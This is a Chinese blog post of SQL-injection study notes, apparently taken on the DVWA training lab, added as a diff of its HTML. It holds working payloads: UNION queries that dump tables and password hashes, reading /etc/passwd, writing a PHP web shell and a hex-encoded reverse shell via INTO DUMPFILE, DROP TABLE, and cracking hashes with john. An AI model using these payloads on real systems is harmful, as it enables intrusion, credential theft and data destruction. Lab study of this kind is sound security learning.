@@ -1,0 +1,913 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="安全," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="1. 五种判断机制 服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器（数据库调用或系统调用） 用户登录判断 SELECT * FROM users WHERE user=’uname’ AND password=’password’ SELECT * FROM users WHERE user=’uname’ AND password=”OR”=”">
+<meta name="keywords" content="安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kali Linux笔记(四十九)：手动漏洞挖掘--SQL注入">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;14&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B9%9D)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E6%B3%A8%E5%85%A5&#x2F;index.html">
+<meta property="og:site_name" content="Tomas&#39;Blog">
+<meta property="og:description" content="1. 五种判断机制 服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器（数据库调用或系统调用） 用户登录判断 SELECT * FROM users WHERE user=’uname’ AND password=’password’ SELECT * FROM users WHERE user=’uname’ AND password=”OR”=”">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-01-14T11:48:43.192Z">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/01/14/Kali Linux笔记(四十九)：手动漏洞挖掘--SQL注入/"/>
+
+
+
+
+
+  <title>Kali Linux笔记(四十九)：手动漏洞挖掘--SQL注入 | Tomas'Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tomas'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B9%9D)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(四十九)：手动漏洞挖掘--SQL注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T20:11:22+08:00">
+                2020-01-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<h4 id="1-五种判断机制"><a href="#1-五种判断机制" class="headerlink" title="1. 五种判断机制"></a>1. 五种判断机制</h4><ul>
+<li>服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器（数据库调用或系统调用）</li>
+<li>用户登录判断<ul>
+<li>SELECT * FROM users WHERE user=’uname’ AND password=’password’</li>
+<li>SELECT * FROM users WHERE user=’uname’ AND password=”OR”=”</li>
+</ul>
+</li>
+<li>基于报错的检测方法（low）<ul>
+<li>‘ “ % ()</li>
+</ul>
+</li>
+<li>基于布尔的检测<ul>
+<li>1’ and ‘1’=’1 / 1’ and ‘1（真）</li>
+<li>1’ and ‘1’=’2 / 1’ and ‘0（假）</li>
+</ul>
+</li>
+<li>表列数/显示信息位于哪一列<ul>
+<li>‘order by 9–+（按查询列号排序）（注释符：–）</li>
+<li>select * 时表字段数=查询字段数</li>
+</ul>
+</li>
+<li>联合查询<ul>
+<li>‘union select 1,2–+ </li>
+<li>‘union all select database()/user()/version(),2– +</li>
+</ul>
+</li>
+<li>‘union select database(),substring index(USER(),”@”,1)–+（切分字段）</li>
+<li>DB用户：user() </li>
+<li>DB版本：version()</li>
+<li>全局函数：@@datadir、@@hostname、@@VERSION、@@version_compile_os</li>
+<li>当前库：database()</li>
+<li>ASCII转字符：char()</li>
+<li>连接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version())</li>
+<li>计算哈希：md5()</li>
+<li>Mysql数据结构<ul>
+<li>information_schema</li>
+</ul>
+</li>
+<li>所有库所有表/统计每库中表的数量<ul>
+<li>‘union select table_name,table_schema from information_schema.tables–+</li>
+<li>‘union select table_schema,count(*) from information_schema.tables group by table_schema–+</li>
+</ul>
+</li>
+<li>Dvwa库中的表名<ul>
+<li>‘union select table_name,table_schema from information_schema.tables where table_schema=’dvwa’–+</li>
+</ul>
+</li>
+<li>Users表中的所有列（user_id,first_name,last_name,user,password,avatar）<ul>
+<li>‘union select table_name,column_name from information_schema.columns where table_schema=’dvwa’ and table_name=’users’–+</li>
+</ul>
+</li>
+<li>查询user、password列的内容<ul>
+<li>‘union select users,password from dvwa,users–+</li>
+<li>‘union select users,password from users–+</li>
+<li>‘union select null,concat(user,0x3a,password) from users–+ </li>
+</ul>
+</li>
+</ul>
+<h4 id="2-密码猜测"><a href="#2-密码猜测" class="headerlink" title="2. 密码猜测"></a>2. 密码猜测</h4><ul>
+<li>hash-identifier<ul>
+<li>输入猜测的值</li>
+</ul>
+</li>
+<li>密码破解<ul>
+<li>username:passhash–&gt;dvwa.txt</li>
+<li>john –format=raw-MD5 dvwa.txt（存在./john文件）</li>
+</ul>
+</li>
+<li>显示之前破解的密码<ul>
+<li>john –format=raw-MD5 dvwa.txt –show</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-系统文件读取-命令执行"><a href="#3-系统文件读取-命令执行" class="headerlink" title="3. 系统文件读取/命令执行"></a>3. 系统文件读取/命令执行</h4><ul>
+<li>读取文件<ul>
+<li>‘union select null,load_file(‘/etc/passwd’)–+</li>
+</ul>
+</li>
+<li>写入文件（原文件形式）<ul>
+<li>‘union select null,”<?php passthru($_GET['cmd']);?>“INTO DUMPFILE “a.php”–+（dumpfile到默认目录，默认目录只有mysql有权限）</li>
+<li>‘union select null,”<?php passthru($_GET['cmd']);?>“INTO DUMPFILE “/var/www/a.php”–+（dumpfile到指定目录）</li>
+<li><ul>
+<li>▲ 脚本可以写到具有777权限的/tmp目录，结合SQL注入和File Inclusion达到作用</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>写入文件（十六进制模式）<ul>
+<li>cp /usr/share/webshells/php/php-reverse-shell.php ./b.php</li>
+<li>cat php-reverse-shell.php | xxd -ps | tr -d ‘\n’（▲ 十六进制编码的shell）</li>
+<li>‘union select null,+(0x十六进制编码) INTO DUMPFILE ‘/tmp/x.php’–+</li>
+<li>可能受到服务器GET大小的限制，传输不成功</li>
+</ul>
+</li>
+<li>保存下载数据库<ul>
+<li>‘union select null,concat(user,0x3a,password) from users INTO OUTFILE ‘/tmp/a.db’–+</li>
+</ul>
+</li>
+<li>一个思路：编写服务器端代码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,&apos;&lt;?php if(isset($_POST[&quot;submit&quot;])) &#123; $userID = $_POST[&quot;userID&quot;]; $first_name = $_POST[&quot;first_name&quot;]; $last_name = $_POST[&quot;last_name&quot;]; $username = $_POST[&quot;username&quot;]; $avatar = $_POST[&quot;avatar&quot;]; echo &quot;userID: $userID&lt;BR&gt;&quot;; echo &quot;first_name: $first_name&lt;BR&gt;&quot;; echo &quot;last_name: $last_name&lt;BR&gt;&quot;; echo &quot;username: $username&lt;BR&gt;&quot;; echo &quot;avatar: $avatar&lt;BR&gt;&quot;; $con=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;&quot;,&quot;dvwa&quot;); if (mysqli_connect_errno()) &#123; echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); &#125; else &#123; echo &quot;Connected to database&lt;BR&gt;&quot;; &#125; $password = &quot;123&quot;; $sql=&quot;insert into dvwa.users values (\\&quot;$userID\\&quot;,\ \&quot;$first_name\\&quot;,\\&quot;$last_name\\&quot;,\\&quot;$username\\&quot;,MD5(\\&quot;$password\\&quot;),\\&quot;$avatar\ \&quot;)&quot;; if (mysqli_query($con,$sql)) &#123; echo &quot;[Successful Insertion]: $sql&quot;; &#125; else &#123; echo &quot;Error creating database: &quot; . mysqli_error($con); &#125; mysqli_close($con); &#125; ?&gt; &lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;]; ?&gt;&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;userID&quot; value=&quot;33&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;first_name&quot; value=&quot;fh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;last_name&quot; value=&quot;y&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;yfh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;avatar&quot; value=&quot;yfh!&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit Form&quot;&gt;&lt;br&gt; &lt;/form&gt;&apos; INTO DUMPFILE &apos;/tmp/user.php&apos; --</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-猜字段–无information-schema"><a href="#4-猜字段–无information-schema" class="headerlink" title="4. 猜字段–无information_schema"></a>4. 猜字段–无information_schema</h4><ul>
+<li>无权读取information_schema库/拒绝union、order by语句<ul>
+<li>猜列名：’and column is null–+（Burpsuite自动猜列名）</li>
+<li>猜当前表表名：’and table.user is null–+</li>
+<li>猜库里其他表：’and (select count(*) from table)&gt;0–+</li>
+<li>列表对应关系：’and users.user is null–+</li>
+<li>猜字段内容：’or user=’admin/‘or user like ‘%a%</li>
+<li>猜账号对应密码：’or user=’admin’ and password=’5f4dcc3b5aa765d61d8327deb832cf99（MD5值）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐之前的SQL注入教程，主要是针对mysql的root权限，如果得到的是mysql的一个普通用户的权限，则很难通过information_schema来查询以及执行指令
+⭐查找column字典
+find / -name *column*.txt
+cat /usr/share/golismero/tools/sqlmap/txt/common-colums.txt | gerp -v ^# &gt; column.txt
+⭐查找table表名
+find / -name *.table*.txt
+cat /usr/share/golismero/tools/sqlmap/txt/common-table.txt | gerp -v ^# &gt;table.txt
+⭐MD5作为字典
+md5sum common-password.txt password.txt</code></pre></blockquote>
+<h4 id="5-用户注入–无information-schema"><a href="#5-用户注入–无information-schema" class="headerlink" title="5. 用户注入–无information_schema"></a>5. 用户注入–无information_schema</h4><ul>
+<li>‘;update users set user=’yuanfh’ where user=’admin’<ul>
+<li>注入失败，sql客户端工具的问题</li>
+<li><a href="http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html" target="_blank" rel="noopener">http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html</a></li>
+</ul>
+</li>
+<li>‘;INSERT into users(‘user_id’,’first_name’,’last_name’,’user’,’password’,’avatar’)VALUES(‘35’,’fh’,’yuan’,’yfh’,’5f4dcc3b5aa765d61d8327deb882cf99’,’OK’);–+</li>
+<li>‘;DROP TABLE users;–+</li>
+<li>xp_cmdshell /存储过程</li>
+<li>▲ SQLi没有通用的方法，掌握原理，了解各种数据库特性 </li>
+</ul>
+<h4 id="6-DVWA的SQL注入源码"><a href="#6-DVWA的SQL注入源码" class="headerlink" title="6. DVWA的SQL注入源码"></a>6. DVWA的SQL注入源码</h4><ul>
+<li>Dvwa的SQL Injection Source（Low）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Submit&apos;]))&#123;</span><br><span class="line">    </span><br><span class="line">    // Retrieve data</span><br><span class="line">    </span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">    $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i = 0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Dvwa的SQL Injection Source（Medium）<ul>
+<li>对特殊字符的转义</li>
+<li>mysql_real_escape_srting()（PHP 4 &gt;=4.3.0，PHP5）</li>
+<li>PHP 5.5.0已经启用此函数</li>
+<li>PHP 7.0.0已经删除此函数，代之以MySQLi、PDO_M有、SQL</li>
+<li>转义字符（\x00、\n、\r、’、”、\x1a）</li>
+<li>▲ 绕过方法：不需要单引号，不需要–，直接插入语句即可</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;;</span><br><span class="line"></span><br><span class="line">    $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">    </span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i=0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Dvwa的SQL Injection Source（High）<ul>
+<li>stripslashes（去除”&quot;）</li>
+<li>mysql_real_escape_string</li>
+<li>▲ is_numric（判断是否为数字）</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    if (is_numeric($id))&#123;</span><br><span class="line"></span><br><span class="line">        $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">        $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">        $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">        $i=0;</span><br><span class="line"></span><br><span class="line">        while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">            $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">            </span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81SessionID%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="next" title="Kali Linux笔记(四十五)：手动漏洞挖掘--身份认证、SessionID、密码找回、命令执行">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(四十五)：手动漏洞挖掘--身份认证、SessionID、密码找回、命令执行
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AB)%EF%BC%9AKali%20Linux%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0--rolling/" rel="prev" title="Kali Linux笔记(四十八)：Kali Linux版本更新--rolling">
+                Kali Linux笔记(四十八)：Kali Linux版本更新--rolling <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/photo.jpg"
+                alt="Tomas" />
+            
+              <p class="site-author-name" itemprop="name">Tomas</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">57</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:643008933@qq.com" target="_blank" title="QQ邮箱">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>QQ邮箱</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-五种判断机制"><span class="nav-number">1.</span> <span class="nav-text">1. 五种判断机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-密码猜测"><span class="nav-number">2.</span> <span class="nav-text">2. 密码猜测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-系统文件读取-命令执行"><span class="nav-number">3.</span> <span class="nav-text">3. 系统文件读取/命令执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-猜字段–无information-schema"><span class="nav-number">4.</span> <span class="nav-text">4. 猜字段–无information_schema</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-用户注入–无information-schema"><span class="nav-number">5.</span> <span class="nav-text">5. 用户注入–无information_schema</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-DVWA的SQL注入源码"><span class="nav-number">6.</span> <span class="nav-text">6. DVWA的SQL注入源码</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tomas</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
